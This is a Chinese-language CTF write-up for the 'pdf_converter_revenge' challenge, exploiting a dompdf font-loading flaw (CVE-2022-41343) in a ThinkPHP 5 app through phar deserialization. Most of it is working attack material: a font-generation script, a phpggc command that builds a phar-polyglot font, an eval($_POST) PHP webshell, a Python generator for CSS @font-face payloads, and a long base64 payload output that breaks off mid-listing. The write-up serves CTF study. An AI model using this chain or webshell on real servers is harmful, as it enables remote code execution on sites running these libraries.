<h1 id="pdf-converter-revenge"><a href="#pdf-converter-revenge" class="headerlink" title="pdf_converter_revenge"></a>pdf_converter_revenge</h1><p>考点：Phar反序列化<br>那个最初的版本就不说了，都是用TP5的RCE直接打的。说说预期解吧，拿到附件后会发现是基于TP5的一个web，有一个依赖迪奥做dompdf<br><a target="_blank" rel="noopener" href="http://buaq.net/go-129526.html">http://buaq.net/go-129526.html</a><br>找到了这一篇文章，里面有详细的说明</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerFont</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$remoteFile</span>, <span class="variable">$context</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    [...]</span><br><span class="line">        <span class="variable">$entry</span>[<span class="variable">$styleString</span>] = <span class="variable">$localFile</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Download the remote file</span></span><br><span class="line">        [<span class="variable">$protocol</span>] = <span class="title class_">Helpers</span>::<span class="title function_ invoke__">explode_url</span>(<span class="variable">$remoteFile</span>);</span><br><span class="line">        <span class="variable">$allowed_protocols</span> = <span class="variable language_">$this</span>-&gt;options-&gt;<span class="title function_ invoke__">getAllowedProtocols</span>();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$protocol</span>, <span class="variable">$allowed_protocols</span>)) &#123;</span><br><span class="line">            <span class="title class_">Helpers</span>::<span class="title function_ invoke__">record_warnings</span>(E_USER_WARNING, <span class="string">&quot;Permission denied on <span class="subst">$remoteFile</span>. The communication protocol is not supported.&quot;</span>, <span class="keyword">__FILE__</span>, <span class="keyword">__LINE__</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$allowed_protocols</span>[<span class="variable">$protocol</span>][<span class="string">&quot;rules&quot;</span>] <span class="keyword">as</span> <span class="variable">$rule</span>) &#123;</span><br><span class="line">            [<span class="variable">$result</span>, <span class="variable">$message</span>] = <span class="variable">$rule</span>(<span class="variable">$remoteFile</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span> !== <span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="title class_">Helpers</span>::<span class="title function_ invoke__">record_warnings</span>(E_USER_WARNING, <span class="string">&quot;Error loading <span class="subst">$remoteFile</span>: <span class="subst">$message</span>&quot;</span>, <span class="keyword">__FILE__</span>, <span class="keyword">__LINE__</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$remoteFileContent</span>, <span class="variable">$http_response_header</span>) = @<span class="title class_">Helpers</span>::<span class="title function_ invoke__">getFileContent</span>(<span class="variable">$remoteFile</span>, <span class="variable">$context</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$remoteFileContent</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要错误就在这一段，在<code>if ($result !== true) </code>后并没有return来结束，因此可以进入<code>getFileContent</code>函数，这意味着可以使用任何协议，然后包括主角phar。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFileContent</span>(<span class="params"><span class="variable">$uri</span>, <span class="variable">$context</span> = <span class="literal">null</span>, <span class="variable">$offset</span> = <span class="number">0</span>, <span class="variable">$maxlen</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="variable">$headers</span> = <span class="literal">null</span>;</span><br><span class="line">        [<span class="variable">$protocol</span>] = <span class="title class_">Helpers</span>::<span class="title function_ invoke__">explode_url</span>(<span class="variable">$uri</span>);</span><br><span class="line">        <span class="variable">$is_local_path</span> = <span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$protocol</span>), [<span class="string">&quot;&quot;</span>, <span class="string">&quot;file://&quot;</span>, <span class="string">&quot;phar://&quot;</span>], <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$can_use_curl</span> = <span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$protocol</span>), [<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span>], <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">set_error_handler</span>([<span class="built_in">self</span>::<span class="variable language_">class</span>, <span class="string">&#x27;record_warnings&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$is_local_path</span> || <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;allow_url_fopen&#x27;</span>) || !<span class="variable">$can_use_curl</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$is_local_path</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$uri</span> = <span class="title class_">Helpers</span>::<span class="title function_ invoke__">encodeURI</span>(<span class="variable">$uri</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$maxlen</span>)) &#123;</span><br><span class="line">                    <span class="variable">$result</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uri</span>, <span class="literal">false</span>, <span class="variable">$context</span>, <span class="variable">$offset</span>, <span class="variable">$maxlen</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$result</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uri</span>, <span class="literal">false</span>, <span class="variable">$context</span>, <span class="variable">$offset</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$result</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$content</span> = <span class="variable">$result</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$http_response_header</span>)) &#123;</span><br><span class="line">                    <span class="variable">$headers</span> = <span class="variable">$http_response_header</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="variable">$can_use_curl</span> &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;curl_exec&#x27;</span>)) &#123;</span><br><span class="line">         [...]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">restore_error_handler</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$content</span>, <span class="variable">$headers</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
<p>可以看到file_get_contents，之后就不赘述了，接下来解释一下复现步骤，由于题目是基于TP5的，那么肯定是可以打TP5的反序列化利用链。<br>首先我们要生成恶意字体文件，用以下脚本去生成：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> fontforge</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    sys.stdout.buffer.write(do_generate_font())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_generate_font</span>() -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    fd, fn = tempfile.mkstemp(suffix=<span class="string">&quot;.ttf&quot;</span>)</span><br><span class="line">    os.close(fd)</span><br><span class="line">    font = fontforge.font()</span><br><span class="line">    font.copyright = <span class="string">&quot;DUMMY FONT&quot;</span></span><br><span class="line">    font.generate(fn)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(fn, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        res = f.read()</span><br><span class="line">    os.unlink(fn)</span><br><span class="line">    result = res</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>大概率会报错font模块没找到<code>apt-get install python3-fontforge </code>安装一下<br>之后可以生成可以font：<br><code>python3 generate_font.py &gt; font.ttf</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682263062633-7b514d07-614b-4ae5-8351-11b8da575c9e.png#averageHue=%23313028&clientId=u9987de23-fb8b-4&from=paste&height=206&id=ud2973db7&name=image.png&originHeight=258&originWidth=1187&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=478246&status=done&style=none&taskId=uf5bff5fb-7ea2-4ace-85fc-257c901b202&title=&width=949.6" alt="image.png"><br>随之用phpggc去生成payload。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682263159494-94f1bad1-ab5e-455a-ae91-21d72249ce20.png#averageHue=%23323228&clientId=u9987de23-fb8b-4&from=paste&height=299&id=u49a8f14b&name=image.png&originHeight=374&originWidth=1511&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=660903&status=done&style=none&taskId=u0c8ebc32-4afa-49d3-8055-fd4d18f4cb0&title=&width=1208.8" alt="image.png"><br><code>./phpggc ThinkPHP/FW1 &lt;remote_path&gt; &lt;local_path&gt;</code><br>用法如上，remote_path是要写入靶场的位置，local_path是你shell文件的位置。<br>需要注意的是。tp5的话写入public文件夹下。因为只有public文件夹下我们可以访问<br>这里我准备的shell如下。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿DESKTOP-OOLM65F)-[/mnt/e/CtfTool/phpggc-master/phpggc-master]</span><br><span class="line">└─<span class="comment"># cat 1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;boogipop&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>php -d phar.readonly=0 phpggc ThinkPHP/FW1 /var/www/html/public ./1.php -p phar -pp font.ttf -o font-polyglot.phar</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682263484113-2f067441-a336-4238-a061-c4ab161441b2.png#averageHue=%23333229&clientId=u9987de23-fb8b-4&from=paste&height=434&id=u9483e141&name=image.png&originHeight=543&originWidth=1456&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1086140&status=done&style=none&taskId=u57219b7d-4a4b-482e-b399-a2163a85e12&title=&width=1164.8" alt="image.png"><br>随后用如下脚本生成payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">PAYLOAD_TEMPLATE_URL_ENCODED = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;%s&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">PAYLOAD_TEMPLATE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;style&gt;</span></span><br><span class="line"><span class="string">    @font-face &#123;</span></span><br><span class="line"><span class="string">        font-family:&#x27;exploit&#x27;;</span></span><br><span class="line"><span class="string">        src:url(&#x27;%s&#x27;);</span></span><br><span class="line"><span class="string">        font-weight:&#x27;normal&#x27;;</span></span><br><span class="line"><span class="string">        font-style:&#x27;normal&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_args</span>():</span><br><span class="line">    parser = argparse.ArgumentParser( prog=<span class="string">&quot;generate_payload.py&quot;</span>,</span><br><span class="line">                      formatter_class=<span class="keyword">lambda</span> prog: argparse.HelpFormatter(prog,max_help_position=<span class="number">50</span>),</span><br><span class="line">                      epilog= <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                       This script will generate payloads for CVE-2022-41343</span></span><br><span class="line"><span class="string">                      &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;file&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Polyglot File&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--path&quot;</span>, default=<span class="string">&quot;/var/www/&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Base path to vendor directory (Default = /var/www/)&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">return</span> args</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    args = get_args()</span><br><span class="line">    file = args.file.strip()</span><br><span class="line">    path = args.path.strip()</span><br><span class="line">    <span class="keyword">if</span>(os.path.exists(file)):</span><br><span class="line">        generate_payloads(file, path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: File doesn&#x27;t exist.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payloads</span>(<span class="params">file, path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        fc = f.read()</span><br><span class="line">    b64 = base64.b64encode(fc)</span><br><span class="line">    data_uri_pure = <span class="string">&quot;data:text/plain;base64,%s&quot;</span> % b64.decode()</span><br><span class="line">    md5 = hashlib.md5(data_uri_pure.encode()).hexdigest()</span><br><span class="line">    data_uri_double_encoded = <span class="string">&quot;data:text/plain;base64,%s&quot;</span> % urllib.parse.quote_plus(urllib.parse.quote_plus(b64.decode()))</span><br><span class="line">    phar_uri = <span class="string">&quot;phar://%s/vendor/dompdf/dompdf/lib/fonts/exploit_normal_%s.ttf##&quot;</span> % (path,md5)</span><br><span class="line">    req1_enc = PAYLOAD_TEMPLATE_URL_ENCODED % data_uri_double_encoded</span><br><span class="line">    req2_enc = PAYLOAD_TEMPLATE_URL_ENCODED % urllib.parse.quote_plus(phar_uri)</span><br><span class="line">    req1_pure = PAYLOAD_TEMPLATE % data_uri_double_encoded</span><br><span class="line">    req2_pure = PAYLOAD_TEMPLATE % phar_uri</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 1 ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req1_enc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 2 ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req2_enc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 1 NOT ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req1_pure)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 2 NOT ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req2_pure)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><code>python exp.py -p &quot;/var/www/html&quot; font-polyglot.phar</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">====== REQUEST 1 ENCODED =======</span><br><span class="line"></span><br><span class="line">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;data:text/plain;base64,AAEAAAANAIAAAwBQRkZUTaDD5rQAAAVwAAAAHE9TLzJVeV76AAABWAAAAGBjbWFwAA0DlgAAAcQAAAE6Y3Z0IAAhAnkAAAMAAAAABGdhc3D%252F%252FwADAAAFaAAAAAhnbHlmPaWWPgAAAwwAAABUaGVhZCE%252FRL0AAADcAAAANmhoZWEEIAAAAAABFAAAACRobXR4ArkAIQAAAbgAAAAMbG9jYQAqAFQAAAMEAAAACG1heHAARwA5AAABOAAAACBuYW1lpiMmRgAAA2AAAAHjcG9zdP%252B3ADIAAAVEAAAAIgABAAAAAQAAj5CsK18PPPUACwPoAAAAAOBrAJ8AAAAA4GsAnwAhAAABKgKaAAAACAACAAAAAAAAAAEAAAKaAAAAWgAAAAD%252F%252FwEqAAEAAAAAAAAAAAAAAAAAAAAAAAEAAAADAAgAAgAAAAAAAgAAAAEAAQAAAEAALgAAAAAABAH0AZAABQAAAooCvAAAAIwCigK8AAAB4AAxAQIAAAIABQMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUGZFZACA%252F%252F8AAAMg%252FzgAWgKaAAAAAAABAAAAAAAAAAAAAAAgAAEBbAAhAAAAAAFNAAAAAAADAAAAAwAAABwAAQAAAAAANAADAAEAAAAcAAQAGAAAAAIAAgAAAAD%252F%252FwAA%252F%252F8AAQAAAAABBgAAAQAAAAAAAAABAgAAAAIAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACECeQAAACoAKgAqAAIAIQAAASoCmgADAAcALrEBAC88sgcEAO0ysQYF3DyyAwIA7TIAsQMALzyyBQQA7TKyBwYB%252FDyyAQIA7TIzESERJzMRIyEBCejHxwKa%252FWYhAlgAAAAADgCuAAEAAAAAAAAACgAWAAEAAAAAAAEACQA1AAEAAAAAAAIABwBPAAEAAAAAAAMAJQCjAAEAAAAAAAQACQDdAAEAAAAAAAUADwEHAAEAAAAAAAYACQErAAMAAQQJAAAAFAAAAAMAAQQJAAEAEgAhAAMAAQQJAAIADgA%252FAAMAAQQJAAMASgBXAAMAAQQJAAQAEgDJAAMAAQQJAAUAHgDnAAMAAQQJAAYAEgEXAEQAVQBNAE0AWQAgAEYATwBOAFQAAERVTU1ZIEZPTlQAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAFIAZQBnAHUAbABhAHIAAFJlZ3VsYXIAAEYAbwBuAHQARgBvAHIAZwBlACAAMgAuADAAIAA6ACAAVQBuAHQAaQB0AGwAZQBkADEAIAA6ACAAMgAzAC0ANAAtADIAMAAyADMAAEZvbnRGb3JnZSAyLjAgOiBVbnRpdGxlZDEgOiAyMy00LTIwMjMAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAFYAZQByAHMAaQBvAG4AIAAwADAAMQAuADAAMAAwAABWZXJzaW9uIDAwMS4wMDAAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAAACAAAAAAAA%252F7UAMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH%252F%252FwACAAAAAQAAAADf7eV1AAAAAOBrAJ8AAAAA4GsAnzw%252FcGhwIF9fSEFMVF9DT01QSUxFUigpOyA%252FPg0K8wMAAAEAAAARAAAAAQAAAAAAvQMAAE86MTM6InRoaW5rXFByb2Nlc3MiOjM6e3M6Mjc6IgB0aGlua1xQcm9jZXNzAHByb2Nlc3NQaXBlcyI7TzoyODoidGhpbmtcbW9kZWxccmVsYXRpb25cSGFzTWFueSI6NTp7czo4OiIAKgBxdWVyeSI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjU6IndoZXJlIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjE6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6NjoiACoAdGFnIjtiOjE7czoxMDoiACoAb3B0aW9ucyI7YToyOntzOjY6ImV4cGlyZSI7aTowO3M6NjoicHJlZml4IjtzOjA6IiI7fXM6MTA6IgAqAGhhbmRsZXIiO086MjM6InRoaW5rXGNhY2hlXGRyaXZlclxGaWxlIjoyOntzOjY6IgAqAHRhZyI7YjowO3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MzYwMDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDtzOjQ6InBhdGgiO3M6NzQ6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1kZWNvZGUvcmVzb3VyY2U9L3Zhci93d3cvaHRtbC9wdWJsaWMvc2hlbGwucGhwIjt9fX19fXM6OToiACoAcGFyZW50IjtPOjE3OiJ0aGlua1xtb2RlbFxNZXJnZSI6MTp7czoxOiJhIjtzOjE6IjEiO31zOjExOiIAKgBsb2NhbEtleSI7czoxOiJhIjtzOjg6IgAqAHBpdm90IjtOO3M6MTM6IgAqAGZvcmVpZ25LZXkiO3M6NTE6IkFBQVBEOXdhSEFnWlhaaGJDZ2tYMUJQVTFSYkoySnZiMmRwY0c5d0oxMHBPejgrQ2crKyI7fXM6MjE6IgB0aGlua1xQcm9jZXNzAHN0YXR1cyI7aTozO3M6MzM6IgB0aGlua1xQcm9jZXNzAHByb2Nlc3NJbmZvcm1hdGlvbiI7YToxOntzOjc6InJ1bm5pbmciO2I6MTt9fQgAAAB0ZXN0LnR4dAQAAADqUEVkBAAAAAx%252Bf9ikAQAAAAAAAHRlc3SpuV9bLO9QZl15mVF8JesEYNmlUQIAAABHQk1C&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">====== REQUEST 2 ENCODED =======</span><br><span class="line"></span><br><span class="line">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;phar%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fvendor%2Fdompdf%2Fdompdf%2Flib%2Ffonts%2Fexploit_normal_58b7eee7dc2adb832946db6e899c457f.ttf%23%23&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">====== REQUEST 1 NOT ENCODED =======</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">    @font-face &#123;</span><br><span class="line">        font-family:&#x27;exploit&#x27;;</span><br><span class="line">        